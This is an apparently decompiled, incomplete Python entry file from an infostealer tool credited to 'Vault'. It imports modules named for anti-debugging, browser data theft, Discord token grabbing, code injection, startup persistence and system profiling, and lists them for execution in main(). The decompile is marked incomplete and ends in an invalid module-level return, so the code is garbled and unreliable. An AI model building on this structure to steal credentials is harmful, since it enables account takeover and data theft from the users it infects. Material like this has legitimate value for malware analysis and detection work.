# pyunpacker v1.0 (by Vault) #

from components.antidebug import AntiDebug
from components.browsers import Browsers
from components.discordtoken import DiscordToken
from components.injection import Injection
from components.startup import Startup
from components.systeminfo import SystemInfo
from config import __CONFIG__

def main():
    funcs = [
        AntiDebug,
        Browsers,
        DiscordToken,
        Injection,
        Startup,
        SystemInfo]
# WARNING: Decompyle incomplete

if __name__ == '__main__':
    main()
    return None
